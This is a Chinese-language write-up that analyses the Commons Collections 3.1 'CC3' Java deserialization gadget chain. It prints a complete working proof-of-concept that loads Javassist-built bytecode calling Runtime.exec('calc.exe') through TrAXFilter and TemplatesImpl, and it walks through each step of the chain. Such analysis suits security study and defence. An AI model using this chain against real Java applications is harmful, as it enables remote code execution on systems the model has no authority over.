# 环境搭建

和CC1所需要的环境一样

- JDK 1.7
- Commons Collections 3.1

在pom.xml中添加依赖

```
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>

    <dependency>
        <groupId>org.javassist</groupId>
        <artifactId>javassist</artifactId>
        <version>3.24.1-GA</version>
    </dependency>
</dependencies>
```



# 前置知识

**利用链**

```
ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                    LazyMap.get()
                        ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InstantiateTransformer.transform()
                        newInstance()
                            TrAXFilter#TrAXFilter()
                            TemplatesImpl.newTransformer()
                                     TemplatesImpl.getTransletInstance()
                                     TemplatesImpl.defineTransletClasses
                                     newInstance()
                                        Runtime.exec()
```

这条链一路跟下来发现是熟悉的东西,前半部分就是CC1的LazyMap链的动态代理,而后半部分命令执行的时候是CC2的加载字节码实现RCE

不过这里并不是通过反射去调用的`TemplatesImpl.newTransformer()`而是通过 TrAXFilter类的构造函数直接调用了`TemplatesImpl.newTransformer()`

![image-20220119165813302](images/1.png)

在该类的构造方法中，调用了传入参数的`newTransformer()`方法，看到这个方法有点熟悉了，可以实现命令执行，并且参数可控；

CC2中，就是在`InvokerTransformer.transform()`中通过反射调用`TemplatesImpl.newTransformer()`方法，而CC3中，就可以直接使用`TrAXFilter`来调用`newTransformer()`方法

而前面走调用transform方法则可以用CC1的LzayMap的动态代理

# 利用链分析

POC

```
package CC3;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC3payload {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass STU = pool.makeClass("T0WN");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        STU.makeClassInitializer().insertBefore(cmd);
        STU.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        STU.writeFile();
        byte[] bytes = STU.toBytecode();
        byte[][] targetbytes = new byte[][]{bytes};

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFiledValue(templates,"_bytecodes",targetbytes);
        setFiledValue(templates,"_name","DawnT0wn");
        setFiledValue(templates,"_class",null);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        ChainedTransformer chain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        LazyMap outmap = (LazyMap) LazyMap.decorate(innermap,chain);

        Class DawnT0wn = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = DawnT0wn.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class,outmap);
        Map mapproxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
        handler = (InvocationHandler) constructor.newInstance(Retention.class,mapproxy);

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CC3.bin"));
        os.writeObject(handler);

        ObjectInputStream fos = new ObjectInputStream(new FileInputStream("CC3.bin"));
        fos.readObject();
    }
    public static void setFiledValue(Object obj,String Filename,Object value) throws Exception
    {
        Field field = obj.getClass().getDeclaredField(Filename);
        field.setAccessible(true);
        field.set(obj,value);
    }
}
```

AnnotationInvocationHandler实现了InvocationHandler接口,并且重写了readObject和invoke方法,可以利用动态代理,将InvocationHandler作为处理器,然后调用处理器的任意方法的时候触发invoke

在readObject中会执行这行代码

```
Iterator var4 = this.memberValues.entrySet().iterator();
```

看看该类的构造器

![image-20220120214250719](images/2.png)

`this.memberValues`是可控的,只要将其包装成动态代理的处理器就可以直接触发invoke方法了

这部分代码如下

```
Class DawnT0wn = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = DawnT0wn.getDeclaredConstructor(Class.class,Map.class);
constructor.setAccessible(true);

InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class,outmap);
Map mapproxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
handler = (InvocationHandler) constructor.newInstance(Retention.class,mapproxy);
```

然后触发invoke方法

在invoke方法中的Switch会走default分支

![image-20220120214627688](images/3.png)

执行`Object var6 = this.memberValues.get(var4);`

因为`this.memberValues`的值是`mapproxy`,而且mapproxy被代理对象是Map接口,LazyMap实现了Map接口,其实看下面代码

```
Map innermap = new HashMap();
Map outmap = LazyMap.decorate(innermap,chain);
```

我们其实是对LazyMap做了一个代理,所以这里是会去调用LazyMap的get方法的

接下来执行`Object value = factory.transform(key);`

![image-20220120215237770](images/4.png)

再看看控制器factory的值怎么来的

```
protected LazyMap(Map map, Transformer factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    }
    this.factory = factory;
}
```

不过构造函数是受保护的,但是在CC1中已经提到了,在这个类里面有个decorate修饰是共有的

```
public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}
```

可以直接调用decorate方法来对LazyMap进行一个回调,调用其构造器对factory进行赋值

```
Map innermap = new HashMap();
Map outmap = LazyMap.decorate(innermap,chain);
```

跟进transform方法相对应的POC代码如下

```
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};

ChainedTransformer chain = new ChainedTransformer(transformers);
```

![image-20220120215553998](images/5.png)

可见调用了`ChainedTransformer`的transform方法,这个方法在CC1中也很熟悉了,对数组中的对象的transform挨个调用,参数是上一个对象,不过这里我们不像CC1那样在这里命令执行

以上都是CC1的内容

这里通过`ConstantTransformer`的`transform`方法返回一个`TrAXFilter`的实例化对象,再调用`InstantiateTransformer`的`transform`方法,参数是`TrAXFilter`对象

ConstantTransformer是老熟人了，这里就直接看InstantiateTransformer了

其transform方法的重要代码如下

```
public Object transform(Object input) {
    try {
        if (input instanceof Class == false) {
            throw new FunctorException(
                "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                    + (input == null ? "null object" : input.getClass().getName()));
        }
        Constructor con = ((Class) input).getConstructor(iParamTypes);
        return con.newInstance(iArgs);
```

可以看到return这里可以实例化一个类,调用其构造器,再看`IParamTypes`和`iArgs`参数

```
public InstantiateTransformer(Class[] paramTypes, Object[] args) {
    super();
    iParamTypes = paramTypes;
    iArgs = args;
}
```

在其构造器的代码中可以看到是完全可控的,而input参数是`TrAXFilter`对象

这里与CC2不同的就是不再是用InvocationHandler的反射去调用newTransform方法,而是找到了应该可用的`TrAXFilter`对象的构造器去调用newTransform方法

![image-20220120220411065](images/6.png)

对应代码

```
TemplatesImpl templates = TemplatesImpl.class.newInstance();
setFiledValue(templates,"_bytecodes",targetbytes);
setFiledValue(templates,"_name","DawnT0wn");
setFiledValue(templates,"_class",null);
```

templates是TemplatesImpl实例所以走到TemplatesImpl的newTransform方法

![image-20220120220541925](images/7.png)

这里就熟悉了接下来就和CC2一样了,再跟一遍

跟进getTransletInstance方法

![image-20220120220713322](images/8.png)

判断`_name`和`_class`参数,都是可以通过反射来控制的，跟进defineTransletClasses方法

![image-20220120220825705](images/9.png)

`_bytecodes`不能为空,否则就抛出异常

```
for (int i = 0; i < classCount; i++) {
    _class[i] = loader.defineClass(_bytecodes[i]);//将bytecodes字节数组还原成Class对象
    final Class superClass = _class[i].getSuperclass();//获取其超类

    // Check if this is the main class
    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  //判断超类是和ABSTRACT_TRANSLET变量相同
        _transletIndex = i;
    }
    else {
        _auxClasses.put(_class[i].getName(), _class[i]);
    }
}
```

所以相对应的POC代码

```
ClassPool pool = ClassPool.getDefault();
CtClass STU = pool.makeClass("T0WN");
String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
STU.makeClassInitializer().insertBefore(cmd);
STU.setSuperclass(pool.get(AbstractTranslet.class.getName()));
STU.writeFile();
byte[] bytes = STU.toBytecode();
byte[][] targetbytes = new byte[][]{bytes};
```

利用Javassist编写恶意类,然后在TemplatesImpl中加载恶意类

接下来实例化恶意类

![image-20220120221410161](images/10.png)

# 漏洞复现

![image-20220120221431349](images/11.png)

命令执行成功





参考链接

https://www.freebuf.com/vuls/252643.html